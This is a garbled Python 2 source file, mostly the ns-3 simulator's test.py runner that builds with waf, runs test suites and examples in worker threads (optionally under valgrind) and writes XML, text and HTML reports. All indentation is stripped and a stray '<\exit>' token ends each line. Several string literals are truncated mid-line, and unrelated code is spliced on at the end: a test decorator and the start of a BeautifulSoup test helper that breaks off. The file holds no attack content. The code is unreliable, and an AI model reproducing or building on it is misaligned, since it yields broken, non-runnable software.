python_tests):<\exit>
if os.path.exists(examples_to_run_path):<\exit>
cpp_examples = get_list_from_file(examples_to_run_path, "cpp_examples")<\exit>
for example_name, do_run, do_valgrind_run in cpp_examples:<\exit>
example_path = os.path.join(cpp_executable_dir, example_name)<\exit>
if os.path.exists(example_path):<\exit>
example_tests.append((example_path, do_run, do_valgrind_run))<\exit>
python_examples = get_list_from_file(examples_to_run_path, "python_examples")<\exit>
for example_name, do_run in python_examples:<\exit>
example_path = os.path.join(python_script_dir, example_name)<\exit>
if os.path.exists(example_path):<\exit>
python_tests.append((example_path, do_run))<\exit>
TMP_OUTPUT_DIR = "testpy-output"<\exit>
def read_test(test):<\exit>
result = test.find('Result').text<\exit>
name = test.find('Name').text<\exit>
if not test.find('Time') is None:<\exit>
time_real = test.find('Time').get('real')<\exit>
else:<\exit>
time_real = ''<\exit>
return (result, name, time_real)<\exit>
def node_to_text (test, f):<\exit>
(result, name, time_real) = read_test(test)<\exit>
output = "%s: Test Suite \"%s\" (%s)\n" % (result, name, time_real)<\exit>
f.write(output)<\exit>
for details in test.findall('FailureDetails'):<\exit>
f.write("    Details:\n")<\exit>
f.write("      Message:   %s\n" % details.find('Message').text)<\exit>
f.write("      Condition: %s\n" % details.find('Condition').text)<\exit>
f.write("      Actual:    %s\n" % details.find('Actual').text)<\exit>
f.write("      Limit:     %s\n" % details.find('Limit').text)<\exit>
f.write("      File:      %s\n" % details.find('File').text)<\exit>
f.write("      Line:      %s\n" % details.find('Line').text)<\exit>
for child in test.findall('Test'):<\exit>
node_to_text(child, f)<\exit>
def translate_to_text(results_file, text_file):<\exit>
f = open(text_file, 'w')<\exit>
import xml.etree.ElementTree as ET<\exit>
et = ET.parse (results_file)<\exit>
for test in et.findall('Test'):<\exit>
node_to_text (test, f)<\exit>
for example in et.findall('Example'):<\exit>
result = example.find('Result').text<\exit>
name = example.find('Name').text<\exit>
if not example.find('Time') is None:<\exit>
time_real = example.find('Time').get('real')<\exit>
else:<\exit>
time_real = ''<\exit>
output = "%s: Example \"%s\" (%s)\n" % (result, name, time_real)<\exit>
f.write(output)<\exit>
f.close()<\exit>
def translate_to_html(results_file, html_file):<\exit>
f = open(html_file, 'w')<\exit>
f.write("<html>\n")<\exit>
f.write("<body>\n")<\exit>
f.write("<center><h1>ns-3 Test Results</h1></center>\n")<\exit>
import xml.etree.ElementTree as ET<\exit>
et = ET.parse(results_file)<\exit>
f.write("<h2>Test Suites</h2>\n")<\exit>
for suite in et.findall('Test'):<\exit>
(result, name, time) = read_test (suite)<\exit>
if result == "PASS":<\exit>
f.write("<h3 style=\"color:green\">%s: %s (%s)</h3>\n" % (result, name, time))<\exit>
elif result == "SKIP":<\exit>
f.write("<h3 style=\"color:<\exit>
else:<\exit>
f.write("<h3 style=\"color:red\">%s: %s (%s)</h3>\n" % (result, name, time))<\exit>
f.write("<table border=\"1\">\n")<\exit>
f.write("<th> Result </th>\n")<\exit>
if result in ["CRASH", "SKIP", "VALGR"]:<\exit>
f.write("<tr>\n")<\exit>
if result == "SKIP":<\exit>
f.write("<td style=\"color:<\exit>
else:<\exit>
f.write("<td style=\"color:red\">%s</td>\n" % result)<\exit>
f.write("</tr>\n")<\exit>
f.write("</table>\n")<\exit>
continue<\exit>
f.write("<th>Test Case Name</th>\n")<\exit>
f.write("<th> Time </th>\n")<\exit>
if result == "FAIL":<\exit>
f.write("<th>Failure Details</th>\n")<\exit>
for case in suite.findall('Test'):<\exit>
(result, name, time) = read_test(case)<\exit>
if result == "FAIL":<\exit>
first_row = True<\exit>
for details in case.findall('FailureDetails'):<\exit>
f.write("<tr>\n")<\exit>
if first_row:<\exit>
first_row = False<\exit>
f.write("<td style=\"color:red\">%s</td>\n" % result)<\exit>
f.write("<td>%s</td>\n" % name)<\exit>
f.write("<td>%s</td>\n" % time)<\exit>
else:<\exit>
f.write("<td></td>\n")<\exit>
f.write("<td></td>\n")<\exit>
f.write("<td></td>\n")<\exit>
f.write("<td>")<\exit>
f.write("<b>Message: </b>%s, " % details.find('Message').text)<\exit>
f.write("<b>Condition: </b>%s, " % details.find('Condition').text)<\exit>
f.write("<b>Actual: </b>%s, " % details.find('Actual').text)<\exit>
f.write("<b>Limit: </b>%s, " % details.find('Limit').text)<\exit>
f.write("<b>File: </b>%s, " % details.find('File').text)<\exit>
f.write("<b>Line: </b>%s" % details.find('Line').text)<\exit>
f.write("</td>\n")<\exit>
f.write("</td>\n")<\exit>
else:<\exit>
f.write("<tr>\n")<\exit>
f.write("<td style=\"color:green\">%s</td>\n" % result)<\exit>
f.write("<td>%s</td>\n" % name)<\exit>
f.write("<td>%s</td>\n" % time)<\exit>
f.write("<td></td>\n")<\exit>
f.write("</tr>\n")<\exit>
f.write("</table>\n")<\exit>
f.write("<h2>Examples</h2>\n")<\exit>
f.write("<table border=\"1\">\n")<\exit>
f.write("<th> Result </th>\n")<\exit>
f.write("<th>Example Name</th>\n")<\exit>
f.write("<th>Elapsed Time</th>\n")<\exit>
for example in et.findall("Example"):<\exit>
f.write("<tr>\n")<\exit>
(result, name, time) = read_test(example)<\exit>
if result == "PASS":<\exit>
f.write("<td style=\"color:green\">%s</td>\n" % result)<\exit>
elif result == "SKIP":<\exit>
f.write("<td style=\"color:<\exit>
else:<\exit>
f.write("<td style=\"color:red\">%s</td>\n" % result)<\exit>
f.write("<td>%s</td>\n" % name)<\exit>
f.write("<td>%s</td>\n" % time)<\exit>
f.write("</tr>\n")<\exit>
f.write("</table>\n")<\exit>
f.write("</body>\n")<\exit>
f.write("</html>\n")<\exit>
f.close()<\exit>
thread_exit = False<\exit>
def sigint_hook(signal, frame):<\exit>
global thread_exit<\exit>
thread_exit = True<\exit>
return 0<\exit>
def read_waf_config():<\exit>
for line in open(".lock-wafbuild", "rt"):<\exit>
if line.startswith("out_dir ="):<\exit>
key, val = line.split('=')<\exit>
out_dir = eval(val.strip())<\exit>
global NS3_BUILDDIR<\exit>
NS3_BUILDDIR = out_dir<\exit>
for line in open("%s/c4che/_cache.py" % out_dir).readlines():<\exit>
for item in interesting_config_items:<\exit>
if line.startswith(item):<\exit>
exec(line, globals())<\exit>
if options.verbose:<\exit>
for item in interesting_config_items:<\exit>
print "%s ==" % item, eval(item)<\exit>
def make_paths():<\exit>
have_DYLD_LIBRARY_PATH = False<\exit>
have_LD_LIBRARY_PATH = False<\exit>
have_PATH = False<\exit>
have_PYTHONPATH = False<\exit>
keys = os.environ.keys()<\exit>
for key in keys:<\exit>
if key == "DYLD_LIBRARY_PATH":<\exit>
have_DYLD_LIBRARY_PATH = True<\exit>
if key == "LD_LIBRARY_PATH":<\exit>
have_LD_LIBRARY_PATH = True<\exit>
if key == "PATH":<\exit>
have_PATH = True<\exit>
if key == "PYTHONPATH":<\exit>
have_PYTHONPATH = True<\exit>
pypath = os.environ["PYTHONPATH"] = os.path.join (NS3_BUILDDIR, "bindings", "python")<\exit>
if not have_PYTHONPATH:<\exit>
os.environ["PYTHONPATH"] = pypath<\exit>
else:<\exit>
os.environ["PYTHONPATH"] += ":" + pypath<\exit>
if options.verbose:<\exit>
print "os.environ[\"PYTHONPATH\"] == %s" % os.environ["PYTHONPATH"]<\exit>
if sys.platform == "darwin":<\exit>
if not have_DYLD_LIBRARY_PATH:<\exit>
os.environ["DYLD_LIBRARY_PATH"] = ""<\exit>
for path in NS3_MODULE_PATH:<\exit>
os.environ["DYLD_LIBRARY_PATH"] += ":" + path<\exit>
if options.verbose:<\exit>
print "os.environ[\"DYLD_LIBRARY_PATH\"] == %s" % os.environ["DYLD_LIBRARY_PATH"]<\exit>
elif sys.platform == "win32":<\exit>
if not have_PATH:<\exit>
os.environ["PATH"] = ""<\exit>
for path in NS3_MODULE_PATH:<\exit>
os.environ["PATH"] += ';' + path<\exit>
if options.verbose:<\exit>
print "os.environ[\"PATH\"] == %s" % os.environ["PATH"]<\exit>
elif sys.platform == "cygwin":<\exit>
if not have_PATH:<\exit>
os.environ["PATH"] = ""<\exit>
for path in NS3_MODULE_PATH:<\exit>
os.environ["PATH"] += ":" + path<\exit>
if options.verbose:<\exit>
print "os.environ[\"PATH\"] == %s" % os.environ["PATH"]<\exit>
else:<\exit>
if not have_LD_LIBRARY_PATH:<\exit>
os.environ["LD_LIBRARY_PATH"] = ""<\exit>
for path in NS3_MODULE_PATH:<\exit>
os.environ["LD_LIBRARY_PATH"] += ":" + path<\exit>
if options.verbose:<\exit>
print "os.environ[\"LD_LIBRARY_PATH\"] == %s" % os.environ["LD_LIBRARY_PATH"]<\exit>
VALGRIND_SUPPRESSIONS_FILE = "testpy.supp"<\exit>
def run_job_synchronously(shell_command, directory, valgrind, is_python, build_path=""):<\exit>
(base, build) = os.path.split (NS3_BUILDDIR)<\exit>
suppressions_path = os.path.join (base, VALGRIND_SUPPRESSIONS_FILE)<\exit>
if is_python:<\exit>
path_cmd = "python " + os.path.join (base, shell_command)<\exit>
else:<\exit>
if len(build_path):<\exit>
path_cmd = os.path.join (build_path, shell_command)<\exit>
else:<\exit>
path_cmd = os.path.join (NS3_BUILDDIR, shell_command)<\exit>
if valgrind:<\exit>
cmd = "valgrind --suppressions=%s --leak-check=full --show-reachable=yes --error-exitcode=2 %s" % (suppressions_path,<\exit>
path_cmd)<\exit>
else:<\exit>
cmd = path_cmd<\exit>
if options.verbose:<\exit>
print "Synchronously execute %s" % cmd<\exit>
start_time = time.time()<\exit>
proc = subprocess.Popen(cmd, shell = True, cwd = directory, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<\exit>
stdout_results, stderr_results = proc.communicate()<\exit>
elapsed_time = time.time() - start_time<\exit>
retval = proc.returncode<\exit>
if valgrind and retval == 0 and "== LEAK SUMMARY:" in stderr_results:<\exit>
retval = 2<\exit>
if options.verbose:<\exit>
print "Return code = ", retval<\exit>
print "stderr = ", stderr_results<\exit>
return (retval, stdout_results, stderr_results, elapsed_time)<\exit>
class Job:<\exit>
def __init__(self):<\exit>
self.is_break = False<\exit>
self.is_skip = False<\exit>
self.is_example = False<\exit>
self.is_pyexample = False<\exit>
self.shell_command = ""<\exit>
self.display_name = ""<\exit>
self.basedir = ""<\exit>
self.tempdir = ""<\exit>
self.cwd = ""<\exit>
self.tmp_file_name = ""<\exit>
self.returncode = False<\exit>
self.elapsed_time = 0<\exit>
self.build_path = ""<\exit>
def set_is_break(self, is_break):<\exit>
self.is_break = is_break<\exit>
def set_is_skip(self, is_skip):<\exit>
self.is_skip = is_skip<\exit>
def set_is_example(self, is_example):<\exit>
self.is_example = is_example<\exit>
def set_is_pyexample(self, is_pyexample):<\exit>
self.is_pyexample = is_pyexample<\exit>
def set_shell_command(self, shell_command):<\exit>
self.shell_command = shell_command<\exit>
def set_build_path(self, build_path):<\exit>
self.build_path = build_path<\exit>
def set_display_name(self, display_name):<\exit>
self.display_name = display_name<\exit>
def set_basedir(self, basedir):<\exit>
self.basedir = basedir<\exit>
def set_tempdir(self, tempdir):<\exit>
self.tempdir = tempdir<\exit>
def set_cwd(self, cwd):<\exit>
self.cwd = cwd<\exit>
def set_tmp_file_name(self, tmp_file_name):<\exit>
self.tmp_file_name = tmp_file_name<\exit>
def set_returncode(self, returncode):<\exit>
self.returncode = returncode<\exit>
def set_elapsed_time(self, elapsed_time):<\exit>
self.elapsed_time = elapsed_time<\exit>
class worker_thread(threading.Thread):<\exit>
def __init__(self, input_queue, output_queue):<\exit>
threading.Thread.__init__(self)<\exit>
self.input_queue = input_queue<\exit>
self.output_queue = output_queue<\exit>
def run(self):<\exit>
while True:<\exit>
job = self.input_queue.get()<\exit>
if job.is_break:<\exit>
return<\exit>
if thread_exit == True:<\exit>
job.set_is_break(True)<\exit>
self.output_queue.put(job)<\exit>
continue<\exit>
if job.is_skip:<\exit>
if options.verbose:<\exit>
print "Skip %s" % job.shell_command<\exit>
self.output_queue.put(job)<\exit>
continue<\exit>
else:<\exit>
if options.verbose:<\exit>
print "Launch %s" % job.shell_command<\exit>
if job.is_example or job.is_pyexample:<\exit>
(job.returncode, standard_out, standard_err, et) = run_job_synchronously(job.shell_command,<\exit>
job.cwd, options.valgrind, job.is_pyexample, job.build_path)<\exit>
else:<\exit>
if options.update_data:<\exit>
update_data = '--update-data'<\exit>
else:<\exit>
update_data = ''<\exit>
(job.returncode, standard_out, standard_err, et) = run_job_synchronously(job.shell_command +<\exit>
" --xml --tempdir=%s --out=%s %s" % (job.tempdir, job.tmp_file_name, update_data),<\exit>
job.cwd, options.valgrind, False)<\exit>
job.set_elapsed_time(et)<\exit>
if options.verbose:<\exit>
print "returncode = %d" % job.returncode<\exit>
print "---------- begin standard out ----------"<\exit>
print standard_out<\exit>
print "---------- begin standard err ----------"<\exit>
print standard_err<\exit>
print "---------- end standard err ----------"<\exit>
self.output_queue.put(job)<\exit>
def run_tests():<\exit>
if not options.nowaf:<\exit>
if options.kinds or options.list or (len(options.constrain) and options.constrain in core_kinds):<\exit>
if sys.platform == "win32":<\exit>
waf_cmd = "waf --target=test-runner"<\exit>
else:<\exit>
waf_cmd = "./waf --target=test-runner"<\exit>
elif len(options.example):<\exit>
if sys.platform == "win32":<\exit>
waf_cmd = "waf --target=%s" % os.path.basename(options.example)<\exit>
else:<\exit>
waf_cmd = "./waf --target=%s" % os.path.basename(options.example)<\exit>
else:<\exit>
if sys.platform == "win32":<\exit>
waf_cmd = "waf"<\exit>
else:<\exit>
waf_cmd = "./waf"<\exit>
if options.verbose:<\exit>
print "Building: %s" % waf_cmd<\exit>
proc = subprocess.Popen(waf_cmd, shell = True)<\exit>
proc.communicate()<\exit>
if proc.returncode:<\exit>
print >> sys.stderr, "Waf died. Not running tests"<\exit>
return proc.returncode<\exit>
read_waf_config()<\exit>
make_paths()<\exit>
build_status_file = os.path.join (NS3_BUILDDIR, 'build-status.py')<\exit>
if os.path.exists(build_status_file):<\exit>
ns3_runnable_programs = get_list_from_file(build_status_file, "ns3_runnable_programs")<\exit>
ns3_runnable_scripts = get_list_from_file(build_status_file, "ns3_runnable_scripts")<\exit>
else:<\exit>
print >> sys.stderr, 'The build status file was not found.  You must do waf build before running test.py.'<\exit>
sys.exit(2)<\exit>
example_tests = []<\exit>
python_tests = []<\exit>
for directory in EXAMPLE_DIRECTORIES:<\exit>
example_directory   = os.path.join("examples", directory)<\exit>
examples_to_run_path = os.path.join(example_directory, "examples-to-run.py")<\exit>
cpp_executable_dir   = os.path.join(NS3_BUILDDIR, example_directory)<\exit>
python_script_dir    = os.path.join(example_directory)<\exit>
parse_examples_to_run_file(<\exit>
examples_to_run_path,<\exit>
cpp_executable_dir,<\exit>
python_script_dir,<\exit>
example_tests,<\exit>
python_tests)<\exit>
for module in NS3_ENABLED_MODULES:<\exit>
module = module[len("ns3-"):]<\exit>
module_directory     = os.path.join("src", module)<\exit>
example_directory    = os.path.join(module_directory, "examples")<\exit>
examples_to_run_path = os.path.join(module_directory, "test", "examples-to-run.py")<\exit>
cpp_executable_dir   = os.path.join(NS3_BUILDDIR, example_directory)<\exit>
python_script_dir    = os.path.join(example_directory)<\exit>
parse_examples_to_run_file(<\exit>
examples_to_run_path,<\exit>
cpp_executable_dir,<\exit>
python_script_dir,<\exit>
example_tests,<\exit>
python_tests)<\exit>
os.environ["NS_LOG"] = ""<\exit>
if options.kinds:<\exit>
path_cmd = os.path.join("utils", "test-runner --print-test-type-list")<\exit>
(rc, standard_out, standard_err, et) = run_job_synchronously(path_cmd, os.getcwd(), False, False)<\exit>
print standard_out<\exit>
if options.list:<\exit>
path_cmd = os.path.join("utils", "test-runner --print-test-name-list")<\exit>
(rc, standard_out, standard_err, et) = run_job_synchronously(path_cmd, os.getcwd(), False, False)<\exit>
print standard_out<\exit>
if options.kinds or options.list:<\exit>
return<\exit>
date_and_time = time.strftime("%Y-%m-%d-%H-%M-%S-CUT", time.gmtime())<\exit>
if not os.path.exists(TMP_OUTPUT_DIR):<\exit>
os.makedirs(TMP_OUTPUT_DIR)<\exit>
testpy_output_dir = os.path.join(TMP_OUTPUT_DIR, date_and_time);<\exit>
if not os.path.exists(testpy_output_dir):<\exit>
os.makedirs(testpy_output_dir)<\exit>
xml_results_file = os.path.join(testpy_output_dir, "results.xml")<\exit>
f = open(xml_results_file, 'w')<\exit>
f.write('<?xml version="1.0"?>\n')<\exit>
f.write('<Results>\n')<\exit>
f.close()<\exit>
if len(options.suite):<\exit>
path_cmd = os.path.join("utils", "test-runner --print-test-name-list")<\exit>
(rc, suites, standard_err, et) = run_job_synchronously(path_cmd, os.getcwd(), False, False)<\exit>
if options.suite in suites:<\exit>
suites = options.suite + "\n"<\exit>
else:<\exit>
print >> sys.stderr, 'The test suite was not run because an unknown test suite name was requested.'<\exit>
sys.exit(2)<\exit>
elif len(options.example) == 0 and len(options.pyexample) == 0:<\exit>
if len(options.constrain):<\exit>
path_cmd = os.path.join("utils", "test-runner --print-test-name-list --test-type=%s" % options.constrain)<\exit>
(rc, suites, standard_err, et) = run_job_synchronously(path_cmd, os.getcwd(), False, False)<\exit>
else:<\exit>
path_cmd = os.path.join("utils", "test-runner --print-test-name-list")<\exit>
(rc, suites, standard_err, et) = run_job_synchronously(path_cmd, os.getcwd(), False, False)<\exit>
else:<\exit>
suites = ""<\exit>
suite_list = suites.split('\n')<\exit>
input_queue = Queue.Queue(0)<\exit>
output_queue = Queue.Queue(0)<\exit>
jobs = 0<\exit>
threads=[]<\exit>
processors = 1<\exit>
if sys.platform != "win32":<\exit>
if 'SC_NPROCESSORS_ONLN'in os.sysconf_names:<\exit>
processors = os.sysconf('SC_NPROCESSORS_ONLN')<\exit>
else:<\exit>
proc = subprocess.Popen("sysctl -n hw.ncpu", shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<\exit>
stdout_results, stderr_results = proc.communicate()<\exit>
if len(stderr_results) == 0:<\exit>
processors = int(stdout_results)<\exit>
for i in range(processors):<\exit>
thread = worker_thread(input_queue, output_queue)<\exit>
threads.append(thread)<\exit>
thread.start()<\exit>
total_tests = 0<\exit>
skipped_tests = 0<\exit>
for test in suite_list:<\exit>
test = test.strip()<\exit>
if len(test):<\exit>
job = Job()<\exit>
job.set_is_example(False)<\exit>
job.set_is_pyexample(False)<\exit>
job.set_display_name(test)<\exit>
job.set_tmp_file_name(os.path.join(testpy_output_dir, "%s.xml" % test))<\exit>
job.set_cwd(os.getcwd())<\exit>
job.set_basedir(os.getcwd())<\exit>
job.set_tempdir(testpy_output_dir)<\exit>
if (options.multiple):<\exit>
multiple = ""<\exit>
else:<\exit>
multiple = " --stop-on-failure"<\exit>
path_cmd = os.path.join("utils", "test-runner --test-name=%s%s" % (test, multiple))<\exit>
job.set_shell_command(path_cmd)<\exit>
if options.valgrind and test in core_valgrind_skip_tests:<\exit>
job.set_is_skip(True)<\exit>
if not NSC_ENABLED and test in core_nsc_missing_skip_tests:<\exit>
job.set_is_skip(True)<\exit>
if options.verbose:<\exit>
print "Queue %s" % test<\exit>
input_queue.put(job)<\exit>
jobs = jobs + 1<\exit>
total_tests = total_tests + 1<\exit>
if len(options.suite) == 0 and len(options.example) == 0 and len(options.pyexample) == 0:<\exit>
if len(options.constrain) == 0 or options.constrain == "example":<\exit>
if ENABLE_EXAMPLES:<\exit>
for test, do_run, do_valgrind_run in example_tests:<\exit>
if os.path.basename(test) in ns3_runnable_programs:<\exit>
if eval(do_run):<\exit>
job = Job()<\exit>
job.set_is_example(True)<\exit>
job.set_is_pyexample(False)<\exit>
job.set_display_name(test)<\exit>
job.set_tmp_file_name("")<\exit>
job.set_cwd(testpy_output_dir)<\exit>
job.set_basedir(os.getcwd())<\exit>
job.set_tempdir(testpy_output_dir)<\exit>
job.set_shell_command(test)<\exit>
job.set_build_path("")<\exit>
if options.valgrind and not eval(do_valgrind_run):<\exit>
job.set_is_skip (True)<\exit>
if options.verbose:<\exit>
print "Queue %s" % test<\exit>
input_queue.put(job)<\exit>
jobs = jobs + 1<\exit>
total_tests = total_tests + 1<\exit>
elif len(options.example):<\exit>
example_name = os.path.basename(options.example)<\exit>
if example_name not in ns3_runnable_programs:<\exit>
print "Example %s is not runnable." % example_name<\exit>
else:<\exit>
job = Job()<\exit>
job.set_is_example(True)<\exit>
job.set_is_pyexample(False)<\exit>
job.set_display_name(options.example)<\exit>
job.set_tmp_file_name("")<\exit>
job.set_cwd(testpy_output_dir)<\exit>
job.set_basedir(os.getcwd())<\exit>
job.set_tempdir(testpy_output_dir)<\exit>
job.set_shell_command(options.example)<\exit>
job.set_build_path(options.buildpath)<\exit>
if options.verbose:<\exit>
print "Queue %s" % options.example<\exit>
input_queue.put(job)<\exit>
jobs = jobs + 1<\exit>
total_tests = total_tests + 1<\exit>
if len(options.suite) == 0 and len(options.example) == 0 and len(options.pyexample) == 0:<\exit>
if len(options.constrain) == 0 or options.constrain == "pyexample":<\exit>
if ENABLE_EXAMPLES:<\exit>
for test, do_run in python_tests:<\exit>
if os.path.basename(test) in ns3_runnable_scripts:<\exit>
if eval(do_run):<\exit>
job = Job()<\exit>
job.set_is_example(False)<\exit>
job.set_is_pyexample(True)<\exit>
job.set_display_name(test)<\exit>
job.set_tmp_file_name("")<\exit>
job.set_cwd(testpy_output_dir)<\exit>
job.set_basedir(os.getcwd())<\exit>
job.set_tempdir(testpy_output_dir)<\exit>
job.set_shell_command(test)<\exit>
job.set_build_path("")<\exit>
if options.valgrind:<\exit>
job.set_is_skip (True)<\exit>
if not ENABLE_PYTHON_BINDINGS:<\exit>
job.set_is_skip (True)<\exit>
if options.verbose:<\exit>
print "Queue %s" % test<\exit>
input_queue.put(job)<\exit>
jobs = jobs + 1<\exit>
total_tests = total_tests + 1<\exit>
elif len(options.pyexample):<\exit>
example_name = os.path.basename(options.pyexample)<\exit>
if example_name not in ns3_runnable_scripts:<\exit>
print "Example %s is not runnable." % example_name<\exit>
else:<\exit>
job = Job()<\exit>
job.set_is_pyexample(True)<\exit>
job.set_display_name(options.pyexample)<\exit>
job.set_tmp_file_name("")<\exit>
job.set_cwd(testpy_output_dir)<\exit>
job.set_basedir(os.getcwd())<\exit>
job.set_tempdir(testpy_output_dir)<\exit>
job.set_shell_command(options.pyexample)<\exit>
job.set_build_path("")<\exit>
if options.verbose:<\exit>
print "Queue %s" % options.pyexample<\exit>
input_queue.put(job)<\exit>
jobs = jobs + 1<\exit>
total_tests = total_tests + 1<\exit>
for i in range(processors):<\exit>
job = Job()<\exit>
job.set_is_break(True)<\exit>
input_queue.put(job)<\exit>
passed_tests = 0<\exit>
failed_tests = 0<\exit>
crashed_tests = 0<\exit>
valgrind_errors = 0<\exit>
for i in range(jobs):<\exit>
job = output_queue.get()<\exit>
if job.is_break:<\exit>
continue<\exit>
if job.is_example or job.is_pyexample:<\exit>
kind = "Example"<\exit>
else:<\exit>
kind = "TestSuite"<\exit>
if job.is_skip:<\exit>
status = "SKIP"<\exit>
skipped_tests = skipped_tests + 1<\exit>
else:<\exit>
if job.returncode == 0:<\exit>
status = "PASS"<\exit>
passed_tests = passed_tests + 1<\exit>
elif job.returncode == 1:<\exit>
failed_tests = failed_tests + 1<\exit>
status = "FAIL"<\exit>
elif job.returncode == 2:<\exit>
valgrind_errors = valgrind_errors + 1<\exit>
status = "VALGR"<\exit>
else:<\exit>
crashed_tests = crashed_tests + 1<\exit>
status = "CRASH"<\exit>
print "%s: %s %s" % (status, kind, job.display_name)<\exit>
if job.is_example or job.is_pyexample:<\exit>
f = open(xml_results_file, 'a')<\exit>
f.write('<Example>\n')<\exit>
example_name = "  <Name>%s</Name>\n" % job.display_name<\exit>
f.write(example_name)<\exit>
if status == "PASS":<\exit>
f.write('  <Result>PASS</Result>\n')<\exit>
elif status == "FAIL":<\exit>
f.write('  <Result>FAIL</Result>\n')<\exit>
elif status == "VALGR":<\exit>
f.write('  <Result>VALGR</Result>\n')<\exit>
elif status == "SKIP":<\exit>
f.write('  <Result>SKIP</Result>\n')<\exit>
else:<\exit>
f.write('  <Result>CRASH</Result>\n')<\exit>
f.write('  <Time real="%.3f"/>\n' % job.elapsed_time)<\exit>
f.write('</Example>\n')<\exit>
f.close()<\exit>
else:<\exit>
if job.is_skip:<\exit>
f = open(xml_results_file, 'a')<\exit>
f.write("<Test>\n")<\exit>
f.write("  <Name>%s</Name>\n" % job.display_name)<\exit>
f.write('  <Result>SKIP</Result>\n')<\exit>
f.write("</Test>\n")<\exit>
f.close()<\exit>
else:<\exit>
if job.returncode == 0 or job.returncode == 1 or job.returncode == 2:<\exit>
f_to = open(xml_results_file, 'a')<\exit>
f_from = open(job.tmp_file_name)<\exit>
f_to.write(f_from.read())<\exit>
f_to.close()<\exit>
f_from.close()<\exit>
else:<\exit>
f = open(xml_results_file, 'a')<\exit>
f.write("<Test>\n")<\exit>
f.write("  <Name>%s</Name>\n" % job.display_name)<\exit>
f.write('  <Result>CRASH</Suite>\n')<\exit>
f.write("</Test>\n")<\exit>
f.close()<\exit>
if job.returncode == 2:<\exit>
f = open(xml_results_file, 'a')<\exit>
f.write("<Test>\n")<\exit>
f.write("  <Name>%s</Name>\n" % job.display_name)<\exit>
f.write('  <Result>VALGR</Result>\n')<\exit>
f.write("</Test>\n")<\exit>
f.close()<\exit>
for thread in threads:<\exit>
thread.join()<\exit>
f = open(xml_results_file, 'a')<\exit>
f.write('</Results>\n')<\exit>
f.close()<\exit>
print "%d of %d tests passed (%d passed, %d skipped, %d failed, %d crashed, %d valgrind errors)" % (passed_tests,<\exit>
total_tests, passed_tests, skipped_tests, failed_tests, crashed_tests, valgrind_errors)<\exit>
if len(options.html):<\exit>
translate_to_html(xml_results_file, options.html)<\exit>
if len(options.text):<\exit>
translate_to_text(xml_results_file, options.text)<\exit>
if len(options.xml):<\exit>
shutil.copyfile(xml_results_file, options.xml)<\exit>
if not ENABLE_TESTS or not ENABLE_EXAMPLES:<\exit>
print<\exit>
if not ENABLE_TESTS:<\exit>
print '***  Note: ns-3 tests are currently disabled. Enable them by adding'<\exit>
print '***  "--enable-tests" to ./waf configure or modifying your .ns3rc file.'<\exit>
print<\exit>
if not ENABLE_EXAMPLES:<\exit>
print '***  Note: ns-3 examples are currently disabled. Enable them by adding'<\exit>
print '***  "--enable-examples" to ./waf configure or modifying your .ns3rc file.'<\exit>
print<\exit>
if not options.retain:<\exit>
shutil.rmtree(testpy_output_dir)<\exit>
if passed_tests + skipped_tests == total_tests:<\exit>
return 0<\exit>
else:<\exit>
return 1<\exit>
def main(argv):<\exit>
parser = optparse.OptionParser()<\exit>
parser.add_option("-b", "--buildpath", action="store", type="string", dest="buildpath", default="",<\exit>
metavar="BUILDPATH",<\exit>
help="specify the path where ns-3 was built (defaults to the build directory for the current variant)")<\exit>
parser.add_option("-c", "--constrain", action="store", type="string", dest="constrain", default="",<\exit>
metavar="KIND",<\exit>
help="constrain the test-runner by kind of test")<\exit>
parser.add_option("-e", "--example", action="store", type="string", dest="example", default="",<\exit>
metavar="EXAMPLE",<\exit>
help="specify a single example to run (with relative path)")<\exit>
parser.add_option("-u", "--update-data", action="store_true", dest="update_data", default=False,<\exit>
help="If examples use reference data files, get them to re-generate them")<\exit>
parser.add_option("-g", "--grind", action="store_true", dest="valgrind", default=False,<\exit>
help="run the test suites and examples using valgrind")<\exit>
parser.add_option("-k", "--kinds", action="store_true", dest="kinds", default=False,<\exit>
help="print the kinds of tests available")<\exit>
parser.add_option("-l", "--list", action="store_true", dest="list", default=False,<\exit>
help="print the list of known tests")<\exit>
parser.add_option("-m", "--multiple", action="store_true", dest="multiple", default=False,<\exit>
help="report multiple failures from test suites and test cases")<\exit>
parser.add_option("-n", "--nowaf", action="store_true", dest="nowaf", default=False,<\exit>
help="do not run waf before starting testing")<\exit>
parser.add_option("-p", "--pyexample", action="store", type="string", dest="pyexample", default="",<\exit>
metavar="PYEXAMPLE",<\exit>
help="specify a single python example to run (with relative path)")<\exit>
parser.add_option("-r", "--retain", action="store_true", dest="retain", default=False,<\exit>
help="retain all temporary files (which are normally deleted)")<\exit>
parser.add_option("-s", "--suite", action="store", type="string", dest="suite", default="",<\exit>
metavar="TEST-SUITE",<\exit>
help="specify a single test suite to run")<\exit>
parser.add_option("-t", "--text", action="store", type="string", dest="text", default="",<\exit>
metavar="TEXT-FILE",<\exit>
help="write detailed test results into TEXT-FILE.txt")<\exit>
parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False,<\exit>
help="print progress and informational messages")<\exit>
parser.add_option("-w", "--web", "--html", action="store", type="string", dest="html", default="",<\exit>
metavar="HTML-FILE",<\exit>
help="write detailed test results into HTML-FILE.html")<\exit>
parser.add_option("-x", "--xml", action="store", type="string", dest="xml", default="",<\exit>
metavar="XML-FILE",<\exit>
help="write detailed test results into XML-FILE.xml")<\exit>
global options<\exit>
options = parser.parse_args()[0]<\exit>
signal.signal(signal.SIGINT, sigint_hook)<\exit>
return run_tests()<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
def _add_tests(generator):<\exit>
def class_decorator(cls):<\exit>
for f, args in generator():<\exit>
test = lambda self, args=args, f=f: f(self, *args)<\exit>
test.__name__ = "test_%s_%s" % (f.__name__, args[0])<\exit>
setattr(cls, test.__name__, test)<\exit>
return cls<\exit>
return class_decorator<\exit>
import copy<\exit>
import functools<\exit>
import unittest<\exit>
from unittest import TestCase<\exit>
from bs4 import BeautifulSoup<\exit>
from bs4.element import (<\exit>
CharsetMetaAttributeValue,<\exit>
Comment,<\exit>
ContentMetaAttributeValue,<\exit>
Doctype,<\exit>
SoupStrainer,<\exit>
)<\exit>
from bs4.builder import HTMLParserTreeBuilder<\exit>
default_builder = HTMLParserTreeBuilder<\exit>
class SoupTest(unittest.TestCase):<\exit>
@property<\exit>
def default_builder(self):<\exit>
return default_builder()<\exit>
def soup(self, markup, **kwargs):<\exit>
